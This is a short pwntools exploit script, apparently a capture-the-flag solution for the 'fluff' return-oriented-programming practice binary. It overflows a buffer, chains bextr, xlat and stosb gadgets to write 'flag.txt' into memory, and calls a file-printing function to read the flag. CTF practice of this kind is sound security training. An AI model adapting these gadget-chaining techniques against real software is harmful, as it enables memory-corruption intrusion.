#!/usr/bin/env python3
from pwn import *

def mov_rbx(value) -> bytes:
    assert value >= 16114
    rcx = value - 16114
    rdx = 64 << 8
    return p64(BEXTR_GADGET) + p64(rdx) + p64(rcx)

context.terminal = ('kgx', '-e')

if args.GDB:
    p = gdb.debug("./fluff", """
        b *pwnme+152
        b *0x400620
        c
    """)
else:
    p = process("./fluff")
    
XLAT_GADGET = 0x400628
BEXTR_GADGET = 0x40062a
STOSB_GADGET = 0x400639
POP_RDI = 0x4006a3
DATA = 0x601028
AL = 0xB

#       f         l         a         g         .         t         x         t
FLAG = [0x4003F4, 0x4003F9, 0x400418, 0x4003CF, 0x4003FD, 0x4003F1, 0x400246, 0x4003F1]
RBXS = []

for i in range(len(FLAG)):
    RBXS.append(mov_rbx(FLAG[i] - AL))
    AL = b'flag.txt'[i]

PAYLOAD = b'a' * 40 + p64(POP_RDI) + p64(DATA) + \
        b''.join([RBXS[i] + p64(XLAT_GADGET) + p64(STOSB_GADGET) for i in range(len(RBXS))]) + \
        p64(POP_RDI) + p64(DATA) + p64(0x400620)

p.sendlineafter(b"> ", PAYLOAD)
p.interactive()